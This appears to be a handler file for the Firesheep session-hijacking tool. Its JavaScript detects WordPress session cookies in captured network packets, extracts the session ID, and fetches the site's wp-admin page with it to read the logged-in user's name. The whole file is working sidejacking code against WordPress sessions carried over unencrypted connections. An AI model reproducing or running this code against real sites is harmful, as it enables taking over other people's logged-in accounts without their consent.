// Authors:
//   Eric Butler <eric@codebutler.com>

register({
  name: 'Wordpress',
  
  matchPacket: function (packet) {
    for (var cookieName in packet.cookies) {
      if (cookieName.match(/^wordpress_[0-9a-fA-F]{32}$/)) {
        return true;
      }
    }
  },

  processPacket: function () {
    this.siteUrl += 'wp-admin/';
  
    for (var cookieName in this.firstPacket.cookies) {
      if (cookieName.match(/^wordpress_[0-9a-fA-F]{32}$/)) {
        this.sessionId = this.firstPacket.cookies[cookieName];
        break;
      }
    }
  },

  identifyUser: function () {
    var resp = this.httpGet(this.siteUrl);
    this.userName = resp.body.querySelectorAll('#user_info a')[0].textContent;
    this.siteName = 'Wordpress (' + this.firstPacket.host + ')';
  }
});  
